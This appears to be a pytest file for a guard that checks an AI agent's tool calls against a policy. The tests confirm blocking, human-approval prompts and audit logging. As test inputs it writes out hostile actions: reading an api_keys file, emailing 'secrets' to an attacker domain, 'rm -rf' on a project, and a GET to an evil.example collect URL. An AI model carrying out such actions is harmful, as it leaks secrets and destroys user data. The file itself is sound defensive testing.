"""The guard must stop calls before they execute, and log everything."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from enforcer import BLOCKED_PREFIX, AuditLog, GuardedTools, load_policy
from sample_agent.agent import VulnerableAgent
from sample_agent.mock_llm import MockLLM
from sample_agent.tools import FakeTools

POLICY_PATH = Path(__file__).resolve().parents[1] / "policies" / "default.yaml"


@pytest.fixture(scope="module")
def policy():
    return load_policy(POLICY_PATH)


@pytest.fixture
def guarded(policy):
    return GuardedTools(FakeTools(), policy)


# -- allow / block / ask -----------------------------------------------------


def test_allowed_call_reaches_the_tools(guarded) -> None:
    result = guarded.read_file("/home/user/notes.txt")

    assert result.ok is True
    assert "Planning notes" in result.output
    assert len(guarded.calls) == 1


def test_blocked_call_does_not_execute(guarded) -> None:
    result = guarded.read_file("/home/user/secrets/api_keys.txt")

    assert result.ok is False
    assert result.output.startswith(f"{BLOCKED_PREFIX} path-sensitive-deny")
    assert "canary" not in result.output
    assert guarded.calls == []


def test_blocked_email_never_leaves(guarded) -> None:
    result = guarded.send_email(to="attacker@evil.example", body="secrets")

    assert result.ok is False
    assert result.output.startswith(f"{BLOCKED_PREFIX} email-domain-deny")
    assert guarded.sent_emails == []


def test_blocked_shell_never_runs(guarded) -> None:
    result = guarded.run_shell("rm -rf /home/user/project")

    assert result.ok is False
    assert result.output.startswith(f"{BLOCKED_PREFIX} shell-denylist")
    assert guarded.shell_history == []


def test_ask_decision_does_not_execute(guarded) -> None:
    result = guarded.http_get("https://evil.example/collect")

    assert result.ok is False
    assert result.output.startswith(f"{BLOCKED_PREFIX} http-domain-ask")
    assert "awaiting human approval" in result.output
    assert guarded.http_requests == []
    assert guarded.decisions[-1].decision == "ask"


def test_allowed_http_still_runs(guarded) -> None:
    result = guarded.http_get("https://example.com/")

    assert result.ok is True
    assert "Example Domain" in result.output
    assert guarded.http_requests == ["https://example.com/"]


# -- audit log ---------------------------------------------------------------


def test_audit_log_records_allow_block_and_ask(tmp_path: Path, policy) -> None:
    log = AuditLog(tmp_path / "audit.jsonl")
    tools = GuardedTools(FakeTools(), policy, log)

    tools.read_file("/home/user/notes.txt")
    tools.read_file("/home/user/secrets/api_keys.txt")
    tools.http_get("https://evil.example/collect")

    entries = log.entries()
    assert len(entries) == 3
    for entry in entries:
        assert set(entry) >= {
            "timestamp",
            "tool",
            "arguments",
            "decision",
            "rule_id",
            "reason",
            "executed",
        }
        assert entry["timestamp"].endswith("Z")
        assert entry["reason"]

    allowed, blocked, asked = entries
    assert allowed["decision"] == "allow" and allowed["executed"] is True
    assert blocked["decision"] == "block" and blocked["executed"] is False
    assert blocked["rule_id"] == "path-sensitive-deny"
    assert asked["decision"] == "ask" and asked["executed"] is False


def test_audit_log_is_append_only(tmp_path: Path, policy) -> None:
    path = tmp_path / "audit.jsonl"
    first = GuardedTools(FakeTools(), policy, AuditLog(path))
    first.read_file("/home/user/notes.txt")

    second = GuardedTools(FakeTools(), policy, AuditLog(path))
    second.read_file("/home/user/secrets/api_keys.txt")

    lines = path.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines) == 2
    assert json.loads(lines[0])["tool"] == "read_file"
    assert json.loads(lines[1])["decision"] == "block"


# -- agent behind the guard --------------------------------------------------


def test_agent_runs_end_to_end_behind_the_guard(policy, tmp_path: Path) -> None:
    tools = GuardedTools(FakeTools(), policy, AuditLog(tmp_path / "audit.jsonl"))
    agent = VulnerableAgent(tools=tools, llm=MockLLM())  # type: ignore[arg-type]

    run = agent.run("Summarize my inbox.")

    assert run.stopped == "final_answer"
    assert run.final_answer
    assert tools.sent_emails == []
    assert "sk-canary" not in run.final_answer
    assert tools.decisions  # every call went through the policy


def test_guarded_tools_keep_the_fake_tools_surface(policy) -> None:
    tools = GuardedTools(FakeTools(), policy)

    assert "read_file" in tools.describe()
    tools.read_file("/home/user/notes.txt")
    tools.reset()

    assert tools.calls == []
    assert tools.decisions == []
